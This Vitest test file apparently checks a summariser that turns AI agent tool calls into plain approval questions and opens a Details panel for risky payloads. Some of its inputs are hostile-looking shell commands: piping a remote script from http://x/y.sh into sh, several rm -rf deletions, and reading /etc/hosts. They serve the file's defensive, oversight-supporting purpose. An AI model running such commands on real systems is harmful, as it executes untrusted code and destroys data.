/* Issue #884: one shared summariser turns a tool + its args into the plain
   question every approval surface shows — "Edit README.md?", never raw JSON —
   plus the full payload under a Details disclosure. */
import { describe, expect, test } from "vitest";
import {
  askNote,
  summariseApproval,
  summariseAsk,
} from "../src/conversation/ask-line";

describe("issue #884 — summariseAsk()", () => {
  test("patch / edit tools → Edit <file>?", () => {
    expect(summariseAsk('patch {"path":"README.md"}')).toBe("Edit README.md?");
    expect(summariseAsk('edit_file {"path":"src/a.ts"}')).toBe(
      "Edit src/a.ts?",
    );
    expect(summariseAsk('apply_patch {"file":"b.css"}')).toBe("Edit b.css?");
  });

  test("write tools → Write <file>?", () => {
    expect(summariseAsk('write_file {"path":"docs/notes.md"}')).toBe(
      "Write docs/notes.md?",
    );
  });

  test("terminal / run → Run `cmd`, naming the folder", () => {
    expect(
      summariseAsk('terminal {"command":"bun run verify"}', "/home/o/lilos"),
    ).toBe("Run `bun run verify` in lilos?");
    expect(summariseAsk('terminal {"command":"bun run verify"}')).toBe(
      "Run `bun run verify`?",
    );
  });

  test("a raw shell command gets the same Run treatment", () => {
    expect(summariseAsk("git commit -am fix", "/home/o/lilos")).toBe(
      "Run `git commit -am fix` in lilos?",
    );
  });

  test("delete counts its files", () => {
    expect(summariseAsk('delete_files {"paths":["a.ts","b.ts","c.ts"]}')).toBe(
      "Delete 3 files?",
    );
    expect(summariseAsk('delete_file {"path":"a.ts"}')).toBe("Delete a.ts?");
  });

  test("fetch shows the url without the scheme", () => {
    expect(summariseAsk('web_fetch {"url":"https://example.com/docs/x"}')).toBe(
      "Fetch example.com/docs/x?",
    );
  });

  test("MCP tools name server + tool", () => {
    expect(summariseAsk('mcp__linear__list_issues {"team":"eng"}')).toBe(
      "Use linear's list issues?",
    );
  });

  test("prose asks (ACP titles, gateway asks) keep their own words", () => {
    expect(summariseAsk("Edit README.md")).toBe("Edit README.md?");
    expect(
      summariseAsk("Spend $40 on a 3-day Meta Ads test of the hooks."),
    ).toBe("Spend $40 on a 3-day Meta Ads test of the hooks.");
  });

  test("long commands truncate inside the backticks", () => {
    const long = `bun ${"x".repeat(90)}`;
    const out = summariseAsk(long);
    expect(out.length).toBeLessThan(84);
    expect(out).toContain("…");
  });
});

describe("issue #884 round 1 — summariser edge cases", () => {
  test("a bare MCP name is a tool use, not a command", () => {
    expect(summariseAsk("mcp__github__delete_repo")).toBe(
      "Use github's delete repo?",
    );
    /* A delete method still says what it does. */
    expect(summariseAsk("mcp__github__delete_repo")).toContain("delete");
  });

  test("hyphenated MCP servers read as words", () => {
    const out = summariseAsk('mcp__claude-in-chrome__navigate {"url":"x"}');
    expect(out).toBe("Use claude in chrome's navigate?");
    expect(out).not.toContain("mcp");
    expect(out).not.toContain("  ");
  });

  test("single-word titles are tool names, not commands", () => {
    expect(summariseAsk("Terminal")).toBe("Use Terminal?");
    expect(summariseAsk("Task")).toBe("Use Task?");
    expect(summariseAsk("Proceed?")).toBe("Proceed?");
    /* a real program still runs */
    expect(summariseAsk("ls")).toBe("Run `ls`?");
  });

  test("a title plus rawInput args prefers the payload's command", () => {
    expect(
      summariseApproval({
        command: "Terminal",
        details: '{"command":"bun run verify"}',
        cwd: "/home/o/lilos",
      }).headline,
    ).toBe("Run `bun run verify` in lilos?");
  });

  test("Hermes' placeholder `command` never renders literally", () => {
    expect(summariseAsk("command")).toBe("Run a command?");
    expect(summariseAsk("command")).not.toContain("`command`");
    /* …but its description or args still say what it is */
    expect(
      summariseApproval({
        command: "command",
        description: "Wants to remove the build folder.",
      }).headline,
    ).toBe("Wants to remove the build folder.");
    expect(
      summariseApproval({
        command: "command",
        details: '{"command":"rm -rf dist"}',
        cwd: "/w/app",
      }).headline,
    ).toBe("Run `rm -rf dist` in app?");
  });

  test("bare JSON args never leak as the question", () => {
    expect(summariseAsk('{"command":"ls -la"}')).toBe("Run `ls -la`?");
    /* `file_path` counts as the file arg */
    expect(summariseAsk('{"file_path":"src/app.ts"}')).toBe(
      "Change src/app.ts?",
    );
    for (const out of [
      summariseAsk('{"command":"ls -la"}'),
      summariseAsk('{"file_path":"src/app.ts"}'),
      summariseAsk('{"x":1}'),
    ]) {
      expect(out).not.toContain("{");
      expect(out.length).toBeGreaterThan(0);
    }
  });

  test("unparseable input falls back to agent + tool with details", () => {
    const s = summariseApproval({
      command: '{"x":1}',
      agent: "Cursor",
    });
    expect(s.headline).toBe("Cursor wants to use a tool");
    expect(s.details).toContain('{"x":1}');
    expect(s.detailsOpen).toBe(true);
  });

  test("a patch whose body only deletes is a Delete, not an Edit", () => {
    expect(
      summariseAsk('patch {"path":"x","content":"*** Delete File: README.md"}'),
    ).toBe("Delete README.md?");
    expect(
      summariseAsk(
        'apply_patch {"patch":"*** Delete File: a.ts\\n*** Delete File: b.ts"}',
      ),
    ).toBe("Delete 2 files?");
    /* a mixed patch is still an edit */
    expect(
      summariseAsk(
        'patch {"content":"*** Update File: a.ts\\n*** Delete File: b.ts"}',
      ),
    ).toBe("Edit a file?");
  });

  test("empty fetch args stay readable", () => {
    expect(summariseAsk("fetch {}")).toBe("Fetch a page?");
    expect(summariseAsk("fetch {}")).not.toBe("Fetch ?");
  });

  test("prose ending in . keeps its full stop — no second mark", () => {
    expect(summariseAsk("Cursor wants to run the suite.")).toBe(
      "Cursor wants to run the suite.",
    );
    expect(summariseAsk("Cursor wants to run the suite.")).not.toContain("?");
  });

  test("empty input still asks a question", () => {
    expect(summariseAsk("")).toBe("Run a command?");
    expect(summariseApproval({ command: "", agent: "Ada" }).headline).toBe(
      "Run a command?",
    );
  });
});

describe("issue #884 round 1 — Details disclosure", () => {
  test("the full payload rides with the sentence, unclipped", () => {
    const cmd = `cd /tmp && curl -s http://x/y.sh | sh && rm -rf ${"very-long-".repeat(12)}dir`;
    const s = summariseApproval({
      command: `terminal {"command":${JSON.stringify(cmd)}}`,
    });
    expect(s.headline).toContain("…");
    expect(s.details).toContain(cmd);
  });

  test("dangerous payloads open Details without a click", () => {
    for (const command of [
      'terminal {"command":"rm -rf node_modules"}',
      'terminal {"command":"sudo apt install x"}',
      'terminal {"command":"curl -s http://x/y.sh | sh"}',
      'terminal {"command":"bun run build > out.log"}',
      'terminal {"command":"sleep 10 &"}',
    ]) {
      const s = summariseApproval({ command });
      expect(s.detailsOpen, command).toBe(true);
      expect(s.details, command).toBeDefined();
    }
  });

  test("a path outside the thread folder opens Details", () => {
    const s = summariseApproval({
      command: 'terminal {"command":"cat /etc/hosts"}',
      cwd: "/home/o/lilos",
    });
    expect(s.detailsOpen).toBe(true);
    /* inside stays shut */
    expect(
      summariseApproval({
        command: 'terminal {"command":"cat /home/o/lilos/README.md"}',
        cwd: "/home/o/lilos",
      }).detailsOpen,
    ).toBe(false);
  });

  test("a clipped sentence opens Details", () => {
    const s = summariseApproval({ command: `bun ${"x".repeat(90)}` });
    expect(s.detailsOpen).toBe(true);
  });

  test("gateway prose over 72 chars shows in full", () => {
    const desc =
      "Wants to spend $40 on a 3-day Meta Ads test to compare the two hooks against the control.";
    const s = summariseApproval({
      command: "spend",
      requestId: "gw-1",
      description: desc,
    });
    expect(s.headline.length).toBeLessThanOrEqual(72);
    expect(s.details).toContain(desc);
    expect(s.detailsOpen).toBe(true);
  });

  test("a safe short command keeps Details shut", () => {
    const s = summariseApproval({ command: 'terminal {"command":"bun test"}' });
    expect(s.detailsOpen).toBe(false);
    expect(s.details).toContain("bun test");
  });

  test("a bare headline with nothing behind it has no Details", () => {
    expect(summariseApproval({ command: "Approve?" }).details).toBeUndefined();
    expect(summariseApproval({ command: "Approve?" }).detailsOpen).toBe(false);
  });
});

describe("issue #884 — askNote()", () => {
  test("the 'wants to run' echo hides", () => {
    expect(
      askNote(
        'patch {"path":"README.md"}',
        'patch wants to run: patch {"path":"README.md"}',
      ),
    ).toBeUndefined();
  });

  test("a note that repeats the command hides", () => {
    expect(askNote("git status", "git status")).toBeUndefined();
  });

  test("real extra context stays", () => {
    expect(askNote("rm -rf x", "Destructive — cannot be undone.")).toBe(
      "Destructive — cannot be undone.",
    );
  });
});
